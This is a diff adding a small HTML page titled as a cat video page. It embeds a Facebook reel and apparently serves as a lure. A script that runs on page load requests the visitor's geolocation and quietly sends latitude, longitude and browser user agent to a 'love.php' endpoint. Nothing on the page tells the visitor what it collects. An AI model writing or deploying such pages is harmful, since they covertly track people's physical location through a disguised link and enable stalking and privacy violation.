@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome To Lovely World!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        .welcome-text {
+            font-weight: bold;
+            font-size: 28px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="center-content">
+        <span class="welcome-text">My Cat's Video</span>
+    </div>
+
+    <iframe
+        src="https://www.facebook.com/plugins/video.php?height=476&href=https%3A%2F%2Fwww.facebook.com%2Freel%2F1679662110150828%2F&show_text=false&width=357&t=0" 
+        width="357" 
+        height="476" 
+        style="border:none;overflow:hidden" 
+        scrolling="no" 
+        frameborder="0" 
+        allowfullscreen="true" 
+        allow="autoplay; clipboard-write; encrypted-media; picture-in-picture; web-share" 
+        allowFullScreen="true">
+    </iframe>
+
+    <p id="love"></p>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else { 
+                document.getElementById("love").innerHTML = "Geolocation is not supported by this browser.";
+            }
+        }
+        function showPosition(position) {
+            const xhttp = new XMLHttpRequest();
+            // Note: Ensure 'love.php' is accessible and configured correctly
+            xhttp.open("GET", "love.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&uagent=" + navigator.userAgent);
+            xhttp.send();
+        }
+	    window.onload = getLocation;
+    </script>
+</body>
+</html>
